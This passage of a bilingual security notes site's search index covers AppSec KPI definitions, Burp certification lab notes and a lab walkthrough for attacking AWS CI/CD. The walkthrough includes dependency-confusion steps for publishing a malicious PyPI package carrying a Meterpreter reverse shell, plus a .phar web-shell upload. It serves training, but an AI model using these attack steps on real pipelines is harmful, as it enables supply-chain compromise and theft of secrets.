decisiones</p> </li> <li>Bayesiano ingenuo</li> </ul>"},{"location":"AppSecKPI/AppSecKPI-EN/","title":"AppSec KPIs &amp; Metrics","text":"<ul> <li>In AppSec, time is often spent implementing controls and processes, but their impact is not adequately measured. Without clear metrics, it is difficult to demonstrate value, justify decisions, or identify opportunities for improvement.</li> <li>In this article, I want to share some of the key metrics I explored within the Security Champions program, based on real experience and applied with concrete data.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI-EN/#fundamental-kpis-in-appsec","title":"Fundamental KPIs in AppSec","text":"<ol> <li> <p>Number of Active Critical Vulnerabilities (NACV)</p> </li> <li> <p>This KPI evaluates the active risk to the business based on the number of critical vulnerabilities open at a given time. It helps answer questions like: Are we improving or accumulating technical debt? How many critical vulnerabilities do we have open? How many of them are in production? How many of them are in production and lack a remediation plan? etc.</p> </li> <li> <p>Time to Remedy (TTR)</p> </li> <li> <p>Measures the average time between the creation of a vulnerability and its remediation. It reflects the team's efficiency in responding to findings and minimizing exposure time.</p> </li> <li>This KPI is essential to understand the team's response speed to vulnerabilities.</li> <li>It helps identify bottlenecks in the remediation process and evaluate the effectiveness of training or code reviews. A low TTR indicates an agile and proactive team, while a high TTR may point to issues in vulnerability management or lack of resources.</li> <li>The equation to measure a low TTR is as follows: TTR = (Resolved_Date - Creation_Date).days</li> <li> <p>This is an approximation; the reality depends on the business logic of each company, but generally, a low TTR is expected.</p> </li> <li> <p>Number of Vulnerabilities per Team (NVT)</p> </li> <li> <p>This indicator helps identify which teams or platforms concentrate vulnerabilities, allowing prioritization of training, reviews, or refactoring.</p> </li> <li>A high NVT in a specific team may indicate the need for a deeper review of its code or processes. It may also point to a lack of training or resources in that team.</li> <li>This KPI is useful for identifying patterns in the occurrence of vulnerabilities and directing training or process improvement efforts toward the teams that need it most.</li> <li> <p>In summary, which team needs more help and what is their level of maturity in terms of security.</p> </li> <li> <p>Time to Remedy per Criticality (TTRC)</p> </li> <li> <p>Similar to TTR but broken down by severity level. Not all vulnerabilities should have the same response time. This KPI helps understand if the most critical ones are being addressed with the appropriate urgency.</p> </li> <li>These metrics depend heavily on the company's and team's culture, but generally, critical vulnerabilities are expected to have a much lower TTR than low-severity ones.</li> <li> <p>Ideal thresholds:</p> <ul> <li>Critical: \u2264 30 days</li> <li>High/Major: \u2264 90 days</li> <li>Normal/Medium: \u2264 120 days</li> <li>Low: \u2264 180 days or even a year</li> </ul> </li> </ol>"},{"location":"AppSecKPI/AppSecKPI-EN/#typical-implementations","title":"Typical Implementations","text":"<ul> <li>All these KPIs can be calculated from queries with Jira, Confluence, or any ticketing tool used by the company.</li> <li>Dashboards can also be implemented in tools like Grafana or Kibana to visualize these KPIs in real-time.</li> <li>For me, the best way is to extract the information into a CSV so that information from different sources can be standardized into the same format.</li> <li>With <code>pandas</code>, we can combine, transform, and filter the data.</li> <li>We can create graphs with <code>matplotlib</code> to visualize the KPIs.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI-EN/#things-to-keep-in-mind","title":"Things to Keep in Mind","text":"<ul> <li>These metrics are useless if there is not enough data or if the data is incomplete or poorly structured.</li> <li>Therefore, it is important to define a clear process for data collection and storage to ensure that the KPIs are accurate and useful.</li> <li>Generally, in security champions and SSDLC programs, a security policy is determined, and a clear process is defined for data collection and storage to ensure that the KPIs are accurate and useful.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI-EN/#example-implementation","title":"Example Implementation","text":"<ul> <li> <p>Repository</p> </li> <li> <p>I made a small implementation in script format for demonstration purposes.</p> </li> </ul>"},{"location":"AppSecKPI/AppSecKPI/","title":"AppSec KPIs &amp; Metrics","text":""},{"location":"AppSecKPI/AppSecKPI/#english-version","title":"English Version","text":"<ul> <li>En AppSec, muchas veces se invierte tiempo en implementar controles y procesos, pero no se mide adecuadamente su impacto. Sin m\u00e9tricas claras, es dif\u00edcil demostrar valor, justificar decisiones o identificar oportunidades de mejora.</li> <li>En este articulo quiero compartir algunas de las m\u00e9tricas clave que estuve explorando dentro del programa de Security Champions, basadas en experiencia real y aplicadas con datos concretos.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI/#kpis-fundamentales-en-appsec","title":"KPIs fundamentales en AppSec","text":"<ol> <li> <p>Number of Active Critical Vulnerabilities (NACV)</p> </li> <li> <p>Este KPI eval\u00faa el riesgo activo para el negocio basado en la cantidad de vulnerabilidades cr\u00edticas abiertas en un momento dado. Permite responder a preguntas como: \u00bfEstamos mejorando o acumulando deuda tecnica? \u00bfCu\u00e1ntas vulnerabilidades cr\u00edticas tenemos abiertas? \u00bfCu\u00e1ntas de ellas est\u00e1n en producci\u00f3n? \u00bfCu\u00e1ntas de ellas est\u00e1n en producci\u00f3n y no tienen un plan de remediaci\u00f3n? etc.</p> </li> <li> <p>Time to Remedy (TTR)</p> </li> <li> <p>Mide el tiempo promedio entre la creaci\u00f3n de una vulnerabilidad y su remediaci\u00f3n. Refleja la eficiencia del equipo en responder a los hallazgos y minimizar el tiempo de exposici\u00f3n.</p> </li> <li>Este KPI es fundamental para entender la velocidad de respuesta del equipo ante vulnerabilidades.</li> <li>Nos deja identificar cuellos de botella en el proceso de remediaci\u00f3n y evaluar la efectividad de las capacitaciones o revisiones de c\u00f3digo. Un TTR bajo indica un equipo \u00e1gil y proactivo, mientras que un TTR alto puede se\u00f1alar problemas en la gesti\u00f3n de vulnerabilidades o falta de recursos.</li> <li> <p>la ecuaci\u00f3n para medir un TTR bajo es la siguiente: TTR = (Fecha_Resuelto - Fecha_Creaci\u00f3n).days</p> <ul> <li>Esto es un aproximado, la realidad es que depende de la l\u00f3gica de negocio por defondo de cada empresa, pero en general se espera que el TTR sea bajo.</li> </ul> </li> <li> <p>Number of Vulnerabilities per Team (NVT)</p> </li> <li> <p>Este indicador nos ayuda a identificar en qu\u00e9 equipos o plataformas se concentran las vulnerabilidades, lo que permite priorizar capacitaciones, revisiones o refactorizaciones.</p> </li> <li>Un NVT alto en un equipo espec\u00edfico puede indicar la necesidad de una revisi\u00f3n m\u00e1s profunda de su c\u00f3digo o procesos. Tambi\u00e9n puede se\u00f1alar la falta de capacitaci\u00f3n o recursos en ese equipo.</li> <li>Este KPI es \u00fatil para identificar patrones en la aparici\u00f3n de vulnerabilidades y para dirigir esfuerzos de capacitaci\u00f3n o mejora de procesos hacia los equipos que m\u00e1s lo necesitan.</li> <li> <p>En resumen que equipo necesita m\u00e1s ayuda y cual es su grado de madurez en cuanto a seguridad.</p> </li> <li> <p>Time to Remedy per Criticity (TTRC)</p> </li> <li> <p>Similar al TTR, pero desglosado por nivel de severidad. No todas las vulnerabilidades deber\u00edan tener el mismo tiempo de respuesta. Este KPI permite entender si las m\u00e1s cr\u00edticas est\u00e1n siendo tratadas con la urgencia adecuada.</p> </li> <li>Estas metricas ya dependen mucho de la cultura de la empresa y el equipo, pero en general se espera que las vulnerabilidades cr\u00edticas tengan un TTR mucho m\u00e1s bajo que las de baja severidad.<ul> <li> <p>Umbrales ideales:</p> <ul> <li>Critical: \u2264 30 d\u00edas</li> <li>High/Major: \u2264 90 d\u00edas</li> <li>Normal/Medium: \u2264 120 d\u00edas</li> <li>Low: \u2264 180 d\u00edas o incluso un a\u00f1o</li> </ul> </li> </ul> </li> </ol>"},{"location":"AppSecKPI/AppSecKPI/#implementaciones-tipicas","title":"Implementaciones tipicas","text":"<ul> <li>Todos estos KPIs pueden calcularse a partir de queries con jira, confluence, o con cualquier herramienta de ticketing que use la empresa.</li> <li>Tambi\u00e9n se pueden implementar dashboards en herramientas como Grafana o Kibana para visualizar estos KPIs en tiempo real.</li> <li>Para m\u00ed la mejor forma es poder extraer la informaci\u00f3n en un CSV de forma que se pueda extraer la informaci\u00f3n de diferentes fuentes para tenerla en el mismo formato o si diferentes fuentes tienen diferentes formatos, poder estandarizarlo.</li> <li>Con <code>pandas</code> podemos combinar y transformar y filtrar los datos.</li> <li>Podemos crear graficos con <code>matplotlib</code> para visualizar los KPIs.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI/#para-tener-en-cuenta","title":"Para tener en cuenta","text":"<ul> <li>Estas metricas no sirven si no hay suficientes datos o si est\u00e1n incompletos o mal estructurados.</li> <li>Por eso es importante definir un proceso claro para la recolecci\u00f3n y almacenamiento de datos, as\u00ed de esta manera podemos asegurar que los KPIs sean precisos y \u00fatiles.</li> <li>Generalmente en los programas de security champions y SSDLC se determina una politica de seguridad y se define un proceso claro para la recolecci\u00f3n y almacenamiento de datos, as\u00ed de esta manera podemos asegurar que los KPIs sean precisos y \u00fatiles.</li> </ul>"},{"location":"AppSecKPI/AppSecKPI/#ejemplo-de-implementacion","title":"Ejemplo de implementaci\u00f3n","text":"<ul> <li>Repositorio</li> <li>Hice una peque\u00f1a implementaci\u00f3n en formato de script con fines demostrativos.</li> </ul>"},{"location":"BSCP/BSCP/","title":"Burp Suite Certified Practitioner (BSCP) Preparation","text":"<ol> <li> <p>En primer lugar completar los laboratorios practicioner https://portswigger.net/web-security/certification/how-to-prepare/practitioner-labs-prep-step-one</p> </li> <li> <p>Notas de laboratorios practicioner</p> </li> </ol>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/","title":"BSCP PRACTICIONER Lab 2: OAuth account hijacking via redirect_uri","text":""},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#tbd-lab","title":"TBD LAB","text":"<ul> <li>Link: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri</li> <li>No estaba andando el lab</li> </ul>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#estudiando-oauth-20","title":"Estudiando OAuth 2.0","text":"<ul> <li>Mientras navegas por la web, es casi seguro que te has encontrado con sitios que te permiten iniciar sesi\u00f3n usando tu cuenta de redes sociales. Lo m\u00e1s probable es que esta funci\u00f3n est\u00e9 construida utilizando el popular marco de trabajo OAuth 2.0. OAuth 2.0 es altamente interesante para los atacantes porque es extremadamente com\u00fan y propenso a errores de implementaci\u00f3n. Esto puede resultar en una serie de vulnerabilidades, permitiendo a los atacantes obtener datos sensibles de los usuarios y, potencialmente, eludir la autenticaci\u00f3n por completo.</li> </ul>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#que-es-oauth","title":"\u00bfQue es OAuth?","text":"<ul> <li>OAuth es un marco de autorizaci\u00f3n com\u00fanmente utilizado que permite a los sitios web y aplicaciones solicitar acceso limitado a la cuenta de un usuario en otra aplicaci\u00f3n. Lo crucial de OAuth es que permite al usuario otorgar este acceso sin exponer sus credenciales de inicio de sesi\u00f3n a la aplicaci\u00f3n solicitante. Esto significa que los usuarios pueden ajustar qu\u00e9 datos desean compartir en lugar de tener que ceder el control total de su cuenta a un tercero.</li> <li>El proceso b\u00e1sico de OAuth se utiliza ampliamente para integrar funcionalidades de terceros que requieren acceso a ciertos datos de la cuenta de un usuario. Por ejemplo, una aplicaci\u00f3n podr\u00eda usar OAuth para solicitar acceso a tu lista de contactos de correo electr\u00f3nico con el fin de sugerir personas con las que conectarte. Sin embargo, el mismo mecanismo tambi\u00e9n se utiliza para proporcionar servicios de autenticaci\u00f3n de terceros, permitiendo a los usuarios iniciar sesi\u00f3n con una cuenta que tienen en otro sitio web.</li> </ul>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#como-funciona","title":"Como funciona","text":"<ul> <li>OAuth 2.0 se desarroll\u00f3 originalmente como una forma de compartir acceso a datos espec\u00edficos entre aplicaciones.</li> <li> <p>Funciona definiendo una serie de interacciones entre tres partes distintas, a saber, una aplicaci\u00f3n cliente, un propietario de recursos y el proveedor de servicios OAuth.</p> </li> <li> <p>Aplicaci\u00f3n cliente: El sitio web o aplicaci\u00f3n web que desea acceder a los datos del usuario.</p> </li> <li>Propietario de recursos: El usuario cuyos datos la aplicaci\u00f3n cliente desea acceder.</li> <li>Proveedor de servicios OAuth: El sitio web o aplicaci\u00f3n que controla los datos del usuario y el acceso a ellos. Soportan OAuth proporcionando una API para interactuar tanto con un servidor de autorizaci\u00f3n como con un servidor de recursos.</li> </ul> <p>Existen numerosas formas diferentes en las que se puede implementar el proceso de OAuth. Estas se conocen como \"flujos\" o \"tipos de concesi\u00f3n\" de OAuth. En este tema, nos centraremos en los tipos de concesi\u00f3n \"c\u00f3digo de autorizaci\u00f3n\" e \"impl\u00edcito\", ya que son, con mucho, los m\u00e1s comunes. En t\u00e9rminos generales, ambos tipos de concesi\u00f3n implican las siguientes etapas:</p> <ol> <li>La aplicaci\u00f3n cliente solicita acceso a un subconjunto de los datos del usuario, especificando qu\u00e9 tipo de concesi\u00f3n desea usar y qu\u00e9 tipo de acceso necesita.</li> <li>Se solicita al usuario que inicie sesi\u00f3n en el servicio OAuth y otorgue expl\u00edcitamente su consentimiento para el acceso solicitado.</li> <li>La aplicaci\u00f3n cliente recibe un token de acceso \u00fanico que demuestra que tiene permiso del usuario para acceder a los datos solicitados. La forma exacta en que esto ocurre var\u00eda significativamente seg\u00fan el tipo de concesi\u00f3n.</li> <li>La aplicaci\u00f3n cliente utiliza este token de acceso para realizar llamadas a la API y obtener los datos relevantes del servidor de recursos.</li> </ol>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#oauth-grant-types","title":"OAuth grant types","text":"<p>El tipo de concesi\u00f3n de OAuth determina la secuencia exacta de pasos que est\u00e1n involucrados en el proceso de OAuth. El tipo de concesi\u00f3n tambi\u00e9n afecta c\u00f3mo la aplicaci\u00f3n cliente se comunica con el servicio OAuth en cada etapa, incluyendo c\u00f3mo se env\u00eda el propio token de acceso. Por esta raz\u00f3n, los tipos de concesi\u00f3n a menudo se denominan \"flujos de OAuth\".</p> <p>Un servicio OAuth debe estar configurado para admitir un tipo de concesi\u00f3n espec\u00edfico antes de que una aplicaci\u00f3n cliente pueda iniciar el flujo correspondiente. La aplicaci\u00f3n cliente especifica qu\u00e9 tipo de concesi\u00f3n desea usar en la solicitud de autorizaci\u00f3n inicial que env\u00eda al servicio OAuth.</p> <p>Existen varios tipos de concesi\u00f3n diferentes, cada uno con distintos niveles de complejidad y consideraciones de seguridad. Nos centraremos en los tipos de concesi\u00f3n \"c\u00f3digo de autorizaci\u00f3n\" e \"impl\u00edcito\", ya que son, con mucho, los m\u00e1s comunes.</p>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#oauth-scopes","title":"OAuth Scopes","text":"<p>Para cualquier tipo de concesi\u00f3n de OAuth, la aplicaci\u00f3n cliente debe especificar qu\u00e9 datos desea acceder y qu\u00e9 tipo de operaciones desea realizar. Esto se hace utilizando el par\u00e1metro scope en la solicitud de autorizaci\u00f3n que env\u00eda al servicio OAuth.</p> <p>Para el OAuth b\u00e1sico, los alcances (scopes) a los que una aplicaci\u00f3n cliente puede solicitar acceso son \u00fanicos para cada servicio OAuth. Dado que el nombre del alcance es simplemente una cadena de texto arbitraria, el formato puede variar dr\u00e1sticamente entre los proveedores. Algunos incluso utilizan un URI completo como nombre del alcance, similar a un endpoint de una API REST. Por ejemplo, al solicitar acceso de solo lectura a la lista de contactos de un usuario, el nombre del alcance podr\u00eda tomar cualquiera de las siguientes formas dependiendo del servicio OAuth que se est\u00e9 utilizando:</p> <pre><code>scope=contacts\nscope=contacts.read\nscope=contact-list-r\nscope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly\n</code></pre> <p>Cuando OAuth se utiliza para autenticaci\u00f3n, sin embargo, a menudo se emplean los alcances estandarizados de OpenID Connect. Por ejemplo, el alcance <code>openid profile</code> otorgar\u00e1 a la aplicaci\u00f3n cliente acceso de solo lectura a un conjunto predefinido de informaci\u00f3n b\u00e1sica sobre el usuario, como su direcci\u00f3n de correo electr\u00f3nico, nombre de usuario, entre otros. Hablaremos m\u00e1s sobre OpenID Connect m\u00e1s adelante.</p>"},{"location":"BSCP/OAuth-account-hijacking-via-redirect_uri/#authorization-code-grant-type","title":"Authorization code grant type","text":"<p>El tipo de concesi\u00f3n de c\u00f3digo de autorizaci\u00f3n inicialmente parece bastante complicado, pero en realidad es m\u00e1s simple de lo que piensas una vez que te familiarizas con algunos conceptos b\u00e1sicos.</p> <p>En resumen, la aplicaci\u00f3n cliente y el servicio OAuth primero utilizan redirecciones para intercambiar una serie de solicitudes HTTP basadas en el navegador que inician el flujo. Se le pide al usuario que consienta el acceso solicitado. Si acepta, a la aplicaci\u00f3n cliente se le otorga un \"c\u00f3digo de autorizaci\u00f3n\". La aplicaci\u00f3n cliente luego intercambia este c\u00f3digo con el servicio OAuth para recibir un \"token de acceso\", que puede usar para realizar llamadas a la API y obtener los datos relevantes del usuario.</p> <p>Toda la comunicaci\u00f3n que ocurre desde el intercambio de c\u00f3digo/token en adelante se env\u00eda de servidor a servidor a trav\u00e9s de un canal seguro y preconfigurado, y, por lo tanto, es invisible para el usuario final. Este canal seguro se establece cuando la aplicaci\u00f3n cliente se registra por primera vez con el servicio OAuth. En este momento, tambi\u00e9n se genera un <code>client_secret</code>, que la aplicaci\u00f3n cliente debe usar para autenticarse al enviar estas solicitudes de servidor a servidor.</p> <p>Dado que los datos m\u00e1s sensibles (el token de acceso y los datos del usuario) no se env\u00edan a trav\u00e9s del navegador, este tipo de concesi\u00f3n es, posiblemente, el m\u00e1s seguro. Las aplicaciones del lado del servidor deber\u00edan idealmente usar siempre este tipo de concesi\u00f3n si es posible.</p> <p></p>"},{"location":"BSCP/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass/","title":"BSCP PRACTICIONER LAB 1: Lab file upload web shell upload via extension blacklist bypass","text":"<p>Link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass</p>"},{"location":"BSCP/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass/#tenemos-un-file-upload-en-una-aplicacion-web-con-backend-php","title":"Tenemos un file upload en una aplicaci\u00f3n web con backend php","text":"<p>Se puede subir una reverse shell en la imagen de perfil con un .phar</p> <p></p> <p></p>"},{"location":"BSCP/practicioner-labs-notes/","title":"Practicioner labs notes index","text":"<p>Step 1: Complete all the listed practitioner-level labs Work through all of the labs in the list below, completing each lab in turn. There is no set time frame for completing the labs, but you must be able to do so without requiring access to the solutions provided.</p> <p>If you're unable to complete the lab you selected, go back to the learning materials and read through the content carefully, working through all the labs in that topic to make sure you're comfortable with the vulnerability class and exploit techniques it covers.</p> <ol> <li>WebShell via extension blacklist bypass</li> <li>OAuth account hijacking via redirect_uri</li> </ol>"},{"location":"CloudHacking/AWS-Attacking/","title":"Attacking AWS","text":""},{"location":"CloudHacking/AWS-Attacking/#cicd","title":"CI/CD","text":"<p>Los sistemas CI/CD son esenciales para automatizar el despliegue de aplicaciones en AWS, requiriendo acceso a c\u00f3digo fuente, secretos y diversos servicios de AWS. Sin embargo, su integraci\u00f3n ampl\u00eda la superficie de ataque, convirti\u00e9ndolos en objetivos principales para atacantes. Comprometer un pipeline CI/CD puede llevar a una escalada de privilegios y un acceso m\u00e1s profundo a la infraestructura en la nube. Este m\u00f3dulo explora vulnerabilidades destacadas en la lista de los Top 10 CI/CD Security Risks de OWASP, con enfoque en t\u00e9cnicas pr\u00e1cticas de explotaci\u00f3n.</p>"},{"location":"CloudHacking/AWS-Attacking/#owasp-top-10-cicd-security-risks","title":"OWASP Top 10 CI/CD Security Risks","text":"<ul> <li>CICD-SEC-1: Insufficient Flow Control Mechanisms</li> <li>CICD-SEC-2: Inadequate Identity and Access Management</li> <li>CICD-SEC-3: Dependency Chain Abuse</li> <li>CICD-SEC-4: Poisoned Pipeline Execution (PPE)</li> <li>CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)</li> <li>CICD-SEC-6: Insufficient Credential Hygiene</li> <li>CICD-SEC-7: Insecure System Configuration</li> <li>CICD-SEC-8: Ungoverned Usage of 3rd Party Services</li> <li>CICD-SEC-9: Improper Artifact Integrity Validation</li> <li>CICD-SEC-10: Insufficient Logging and Visibility</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#parte-1-secretos-expuestos-y-ejecucion-de-pipeline-envenenado","title":"Parte 1: Secretos Expuestos y Ejecuci\u00f3n de Pipeline Envenenado","text":"<p>Esta secci\u00f3n se centra en explotar vulnerabilidades relacionadas con CICD-SEC-4: Poisoned Pipeline Execution (PPE), CICD-SEC-5: Insufficient PBAC y CICD-SEC-6: Insufficient Credential Hygiene.</p>"},{"location":"CloudHacking/AWS-Attacking/#conceptos-clave","title":"Conceptos Clave","text":"<ul> <li>Ejecuci\u00f3n de Pipeline Envenenado (PPE):</li> <li>Los atacantes toman control de scripts de construcci\u00f3n/despliegue, lo que puede llevar a:<ul> <li>Ejecuci\u00f3n de un shell inverso.</li> <li>Robo de secretos sensibles.</li> </ul> </li> <li> <p>Ejemplo: Inyectar c\u00f3digo malicioso en un script de pipeline para ejecutar acciones no autorizadas.</p> </li> <li> <p>Controles de Acceso Basados en Pipeline Insuficientes (PBAC):</p> </li> <li>Los pipelines carecen de protecci\u00f3n adecuada para secretos y activos sensibles, permitiendo accesos no autorizados.</li> <li> <p>Ejemplo: Roles con permisos excesivos que permiten comprometer recursos sensibles.</p> </li> <li> <p>Higiene de Credenciales Insuficiente:</p> </li> <li>Gesti\u00f3n d\u00e9bil de secretos y tokens, haci\u00e9ndolos propensos a filtraciones o escaladas.</li> <li>Ejemplo: Credenciales codificadas en scripts o almacenadas en ubicaciones accesibles p\u00fablicamente.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#ejemplo-de-explotacion","title":"Ejemplo de Explotaci\u00f3n","text":"<ul> <li>Escenario: Explotar una mala configuraci\u00f3n de un bucket S3 para acceder a credenciales de Git.</li> <li>Pasos:</li> <li>Identificar un bucket S3 mal configurado (ej., con acceso de lectura p\u00fablico) que contenga credenciales de Git.</li> <li>Usar las credenciales para modificar el pipeline CI/CD.</li> <li>Inyectar un payload malicioso en el pipeline para:<ul> <li>Robar secretos (ej., claves API, tokens).</li> <li>Comprometer el entorno (ej., obtener un shell inverso).</li> </ul> </li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#parte-2-abuso-de-la-cadena-de-dependencias","title":"Parte 2: Abuso de la Cadena de Dependencias","text":"<p>Esta secci\u00f3n cubre CICD-SEC-3: Dependency Chain Abuse, CICD-SEC-5: Insufficient PBAC, CICD-SEC-7: Insecure System Configuration y CICD-SEC-9: Improper Artifact Integrity Validation.</p>"},{"location":"CloudHacking/AWS-Attacking/#conceptos-clave_1","title":"Conceptos Clave","text":"<ul> <li>Abuso de la Cadena de Dependencias:</li> <li>Los atacantes enga\u00f1an al sistema de construcci\u00f3n para que descargue c\u00f3digo malicioso mediante:<ul> <li>Secuestro de una dependencia oficial.</li> <li>Creaci\u00f3n de paquetes con nombres similares (typosquatting).</li> </ul> </li> <li> <p>Ejemplo: Publicar un paquete malicioso en un repositorio p\u00fablico que el pipeline descargue.</p> </li> <li> <p>Controles de Acceso Basados en Pipeline Insuficientes (PBAC):</p> </li> <li>Los pipelines tienen permisos excesivos, aumentando la vulnerabilidad a compromisos.</li> <li> <p>Ejemplo: Un rol de pipeline con permisos IAM demasiado amplios accede a recursos no previstos.</p> </li> <li> <p>Configuraci\u00f3n de Sistema Insegura:</p> </li> <li>Configuraciones err\u00f3neas o c\u00f3digo inseguro en aplicaciones del pipeline.</li> <li> <p>Ejemplo: Software de pipeline sin parches o entornos de construcci\u00f3n mal configurados.</p> </li> <li> <p>Validaci\u00f3n de Integridad de Artefactos Inadecuada:</p> </li> <li>La falta de verificaciones permite a los atacantes inyectar c\u00f3digo malicioso en el pipeline.</li> <li>Ejemplo: Desplegar artefactos no verificados que contienen payloads maliciosos.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#ejemplo-de-explotacion_1","title":"Ejemplo de Explotaci\u00f3n","text":"<ul> <li>Escenario: Explotar una dependencia ausente en un repositorio p\u00fablico para desplegar c\u00f3digo malicioso.</li> <li>Pasos:</li> <li>Identificar una dependencia mencionada en informaci\u00f3n p\u00fablica pero ausente en el repositorio.</li> <li>Publicar un paquete malicioso con el mismo nombre en un repositorio p\u00fablico (ej., npm, PyPI).</li> <li>El pipeline CI/CD descarga y ejecuta el paquete malicioso en producci\u00f3n.</li> <li>En producci\u00f3n:<ul> <li>Escanear la red para descubrir servicios adicionales.</li> <li>Crear un t\u00fanel hacia el servidor de automatizaci\u00f3n.</li> <li>Explotar una vulnerabilidad en un plugin para obtener claves AWS.</li> </ul> </li> <li>Acceder a un bucket S purportado que contiene un archivo de estado de Terraform con claves AWS de administrador.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#dependency-confusion","title":"Dependency Confusion","text":"<p>El Abuso de la Cadena de Dependencias ocurre cuando un atacante enga\u00f1a al sistema de construcci\u00f3n para que descargue c\u00f3digo malicioso, secuestrando dependencias leg\u00edtimas o usando nombres similares (typosquatting).</p>"},{"location":"CloudHacking/AWS-Attacking/#riesgos-asociados","title":"Riesgos Asociados","text":"<ul> <li>Permisos Excesivos en Pipelines: Controles de acceso insuficientes aumentan el riesgo de compromiso.</li> <li>Configuraciones Inseguras: Errores en la configuraci\u00f3n o c\u00f3digo vulnerable.</li> <li>Validaci\u00f3n D\u00e9bil de Artefactos: Permite inyectar c\u00f3digo malicioso sin detecci\u00f3n.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#pasos-del-ataque","title":"Pasos del Ataque","text":"<ol> <li>Identificar una dependencia ausente en informaci\u00f3n p\u00fablica.</li> <li>Publicar un paquete malicioso con el mismo nombre en un repositorio p\u00fablico.</li> <li>El pipeline CI/CD ejecuta el paquete en producci\u00f3n.</li> <li>Explotar el acceso:</li> <li>Escanear la red interna.</li> <li>Tunelizar al servidor de automatizaci\u00f3n.</li> <li>Explotar plugins para obtener claves AWS.</li> <li>Acceder a un bucket S3 con claves administrativas en un archivo Terraform.</li> </ol>"},{"location":"CloudHacking/AWS-Attacking/#ataque-a-la-cadena-de-dependencias","title":"Ataque a la Cadena de Dependencias","text":""},{"location":"CloudHacking/AWS-Attacking/#objetivos","title":"Objetivos","text":"<ul> <li>Entender el ataque.</li> <li>Publicar un paquete malicioso.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#riesgos-de-seguridad-owasp","title":"Riesgos de Seguridad OWASP","text":"<ul> <li>CICD-SEC-3: Dependency Chain Abuse: </li> <li>Un atacante publica un paquete malicioso con un nombre id\u00e9ntico o similar al de una dependencia leg\u00edtima, aprovechando la priorizaci\u00f3n de repositorios p\u00fablicos sobre privados.</li> <li>CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls): </li> <li>Los pipelines tienen permisos excesivos, permitiendo acceso no autorizado a recursos sensibles.</li> <li>CICD-SEC-7: Insecure System Configuration: </li> <li>Configuraciones err\u00f3neas o c\u00f3digo inseguro en pipelines introducen vulnerabilidades explotables.</li> <li>CICD-SEC-9: Improper Artifact Integrity Validation: </li> <li>La falta de verificaciones permite inyectar c\u00f3digo malicioso en artefactos desplegados.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#como-funciona","title":"C\u00f3mo Funciona","text":"<p>Los gestores de paquetes (ej., PyPI) priorizan repositorios p\u00fablicos o versiones m\u00e1s altas. Un atacante puede subir un paquete malicioso con una versi\u00f3n superior, que ser\u00e1 descargado en lugar del leg\u00edtimo.</p>"},{"location":"CloudHacking/AWS-Attacking/#configuracion-de-pip","title":"Configuraci\u00f3n de <code>pip</code>","text":"<ul> <li><code>index-url</code>: Repositorio predeterminado (PyPI).</li> <li><code>extra-index-url</code>: Busca en m\u00faltiples repositorios, priorizando la versi\u00f3n m\u00e1s alta.</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#especificadores-de-version","title":"Especificadores de Versi\u00f3n","text":"<ul> <li><code>==</code>: Versi\u00f3n exacta (ej., <code>1.0.0</code>).</li> <li><code>&lt;=</code>, <code>&gt;=</code>: Versiones menores o mayores.</li> <li><code>~=</code> : Versiones compatibles (ej., <code>~=1.0.0</code> acepta 1.0.1, no 1.2.0).</li> </ul>"},{"location":"CloudHacking/AWS-Attacking/#pasos-del-ataque_1","title":"Pasos del Ataque","text":"<ol> <li>Reconocimiento:</li> <li>Identificar una dependencia ausente o mencionada en informaci\u00f3n p\u00fablica (ej., un foro que revela el uso de <code>hackshort-util~=1.1.0</code>).</li> <li> <p>Confirmar que el pipeline usa <code>pip</code> con <code>extra-index-url</code>, aumentando la probabilidad de priorizar un repositorio p\u00fablico.</p> </li> <li> <p>Creaci\u00f3n de un Paquete Malicioso:</p> </li> <li>Crear un paquete Python (<code>hackshort-util-1.1.4</code>) que coincida con el nombre y cumpla con el especificador de versi\u00f3n (<code>~=1.1.0</code>).</li> <li> <p>Incluir un payload malicioso (ej., un shell inverso Meterpreter) en el archivo <code>utils.py</code> del paquete.</p> </li> <li> <p>Ejecuci\u00f3n en Tiempo de Instalaci\u00f3n:</p> </li> <li> <p>El paquete ejecuta c\u00f3digo malicioso durante la instalaci\u00f3n, escribiendo en <code>/tmp/running_during_install</code> para confirmar la ejecuci\u00f3n.</p> </li> <li> <p>Ejecuci\u00f3n en Tiempo de Ejecuci\u00f3n:</p> </li> <li> <p>Crear un archivo <code>utils.py</code> con:</p> <ul> <li>Una funci\u00f3n comod\u00edn <code>__getattr__</code> para manejar cualquier llamada a funciones inexistentes.</li> <li>Un gancho de excepci\u00f3n (<code>sys.excepthook</code>) para capturar errores y mantener el control.</li> <li>Un payload Meterpreter para enviar un shell inverso al atacante.</li> </ul> </li> <li> <p>Publicaci\u00f3n del Paquete:</p> </li> <li>Subir el paquete a un repositorio p\u00fablico simulado (ej., <code>http://pypi.offseclab.io/</code>) usando credenciales proporcionadas (<code>student:password</code>).</li> <li> <p>Configurar <code>~/.pypirc</code> para especificar el repositorio y subir el paquete con:      <pre><code>python3 setup.py sdist upload -r 